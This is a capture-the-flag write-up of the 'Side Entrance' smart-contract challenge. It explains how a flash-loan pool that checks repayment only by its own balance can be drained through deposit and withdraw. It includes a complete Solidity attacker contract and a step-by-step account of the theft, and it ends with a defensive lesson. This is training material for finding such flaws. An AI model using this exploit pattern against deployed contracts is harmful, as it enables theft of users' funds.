# Challenge #4: Side Entrance

In this challenge we have to steal ETH from another lending pool smart contract which has 1000 ETH and we have nothing.

The description mentions that the smart contract has functions such us deposit and withdraw. This means that we can manupulate the Ether balance of the lender.

There are two important things here to notice:
1. The withdraw and deposit functions are **not** non-reentrant.
2. The contract verifies whether the loan was paid back by checking the ETH balance of itself.

## Exploit

In order to steal pools's ETH I have to borrow all its ETH, deposit it (when processing the flash loan) and later withdraw it. Check out the exploit code:

```
contract SideEntranceAttacker {
    using Address for address payable;

    SideEntranceLenderPool lender;

    function attack(SideEntranceLenderPool _lender) external {
        lender = _lender;
        uint256 amount = address(lender).balance;
        lender.flashLoan(amount);
        lender.withdraw();
        msg.sender.sendValue(amount);
    } 

    function execute() external payable {
        lender.deposit{value: msg.value}();
    }

    receive() external payable {
        
    }
}
```

First, my *SideEntranceAttacker* contract must implement the *IFlashLoanEtherReceiver* interface that specifies one function - *execute*. The only thing this function does is to deposit all the Ether it receives.

The right exploit starts by calling the *attack* function of the deployed *SideEntranceAttacker* contract.

1. The first step of this function is to check the lender's balance and call the *flashLoan* function. 
2. Then, the lender calls my *execute* function which sends back all Ether to the lender using the *deposit* function. The *flashLoan* function will be successful, because the expression `address(this).balance >= balanceBefore` is true. 
3. The last step is to withdraw all deposited Ether and send it to the attacker's address. 

## Lesson learned

This example shows that you must not allow to change the lender's balance when processing the loan when the lender verifies the correctness of the loan repayment on the base of its balance. 

It can be achieved by specifying all functions that change the balance as non-reentrant.

[<< Back to the README](../README.md)